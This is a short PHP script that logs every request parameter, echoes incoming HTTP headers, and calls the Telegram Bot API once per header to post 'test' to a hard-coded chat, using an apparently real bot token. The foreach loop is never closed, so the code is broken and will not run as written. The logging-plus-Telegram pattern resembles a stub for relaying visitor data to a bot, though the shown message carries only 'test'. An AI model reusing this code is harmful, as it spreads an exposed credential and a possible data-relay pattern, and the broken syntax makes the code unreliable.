<?php
   error_log(implode("|",$_REQUEST));
   foreach (getallheaders() as $name => $value) {
    echo "$name: $value\n";
    // Get cURL resource
$curl = curl_init();
// Set some options - we are passing in a useragent too here
curl_setopt_array($curl, [
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => 'https://api.telegram.org/bot937782324:AAFxgtrxcMuHlMMMK0JmT8H8-RnqTwsz7JY/sendMessage?chat_id=-261885730&text=test'
]);
// Send the request & save response to $resp
$resp = curl_exec($curl);
// Close request to clear up some resources
curl_close($curl);
?>

<script>
   
</script>
